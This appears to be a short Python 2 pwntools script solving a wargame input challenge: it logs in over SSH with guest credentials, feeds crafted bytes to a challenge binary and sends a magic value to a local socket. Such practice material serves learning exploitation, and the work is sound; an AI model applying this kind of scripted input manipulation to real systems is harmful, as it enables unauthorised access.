from pwn import *
import socket
import time

s =  ssh(host='wnable.kr', port=9999, user='inpu2', password='guest')
p = s.process('/tmp/inputsanti')

p.sendline("\x00\x0a\x00\xff")
p.sendline("\x00\x0a\x02\xff")

print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(("127.0.0.1", 1337))
soc.send("\xde\xad\xbe\xef")

print p.recvline()

p.interactive()

